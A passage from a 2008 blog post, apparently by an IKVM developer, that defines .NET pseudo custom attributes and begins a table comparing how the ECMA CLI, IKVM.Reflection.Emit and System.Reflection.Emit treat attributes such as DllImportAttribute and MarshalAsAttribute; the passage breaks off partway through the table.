		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 25 November 2008</h2></div>
<div class="newsItems"><a name="a45d72b78-1aba-48f4-91c3-b0c98accd99a"></a><div class="entry">
	<h3 class="entryTitle">Pseudo Custom Attributes</h3>
	<div class="entryBody">
		<P>One of the really cool things about the CLR, when it was introduced, was the notion of custom attributes. Custom attributes provide an extensible way to add custom metadata. However, since .NET compilers virtually have to support custom attributes, it's tempting to reuse this capability for specifying non-custom metadata. It isn't efficient to encode all metadata in a generic way, hence the pseudo custom attributes were born. From most compilers they appear as normal custom attributes, but the compiler stores them in the metadata in a way that is specific to each pseudo custom attribute.</P>
<P>To recap, my definition of pseudo custom attributes is: Any custom attribute that modifies the metadata, but isn't stored in the <A href="http://download.microsoft.com/download/7/3/3/733AD403-90B2-4064-A81E-01035A7FE13C/MS%20Partition%20II.pdf">CustomAttribute metadata table</A>.</P>
<P>While implementing ikvmc (and later IKVM.Reflection.Emit) I looked for a definitive list of pseudo custom attributes, but there doesn't appear to be one, so I thought I'd make one:</P>
<DIV style="DIRECTION: ltr">
<TABLE style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; BORDER-COLLAPSE: collapse; DIRECTION: ltr; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid" border=1 cellSpacing=0 cellPadding=0 valign="top">
<TBODY>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.24in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">&nbsp;</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 0.815in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">ECMA CLI</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.545in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">IKVM.Reflection.Emit</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.67in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">System.Reflection.Emit</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.24in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.reflection.assemblyalgorithmidattribute.aspx">AssemblyAlgorithmIdAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 0.815in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes*</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.545in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.67in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.24in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.reflection.assemblycultureattribute.aspx">AssemblyCultureAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 0.815in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.545in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.67in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.24in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.reflection.assemblyflagsattribute.aspx">AssemblyFlagsAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 0.815in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes*</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.545in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.67in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.24in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.reflection.assemblykeyfileattribute.aspx">AssemblyKeyFileAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 0.815in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.545in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.67in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.24in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.reflection.assemblykeynameattribute.aspx">AssemblyKeyNameAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 0.815in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.545in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.67in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.24in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.reflection.assemblyversionattribute.aspx">AssemblyVersionAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 0.815in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.545in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.67in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.24in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.security.permissions.codeaccesssecurityattribute.aspx">CodeAccessSecurityAttribute</A>**</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 0.815in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.545in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.67in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.24in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.comimportattribute.aspx">ComImportAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 0.815in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.545in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.67in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.24in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.defaultparametervalueattribute.aspx">DefaultParameterValueAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 0.815in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.545in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.67in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">No</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.24in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.dllimportattribute.aspx">DllImportAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 0.815in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.545in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.67in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.24in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.fieldoffsetattribute.aspx">FieldOffsetAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 0.815in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.545in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.67in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.24in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.inattribute.aspx">InAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 0.815in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.545in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 1.67in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD></TR>
<TR>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 2.24in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt"><A href="http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.marshalasattribute.aspx">MarshalAsAttribute</A></P></TD>
<TD style="BORDER-BOTTOM: #a3a3a3 1pt solid; BORDER-LEFT: #a3a3a3 1pt solid; PADDING-BOTTOM: 4pt; PADDING-LEFT: 4pt; WIDTH: 0.815in; PADDING-RIGHT: 4pt; VERTICAL-ALIGN: top; BORDER-TOP: #a3a3a3 1pt solid; BORDER-RIGHT: #a3a3a3 1pt solid; PADDING-TOP: 4pt">
<P style="MARGIN: 0in; FONT-FAMILY: Calibri; FONT-SIZE: 11pt">Yes</P></TD>
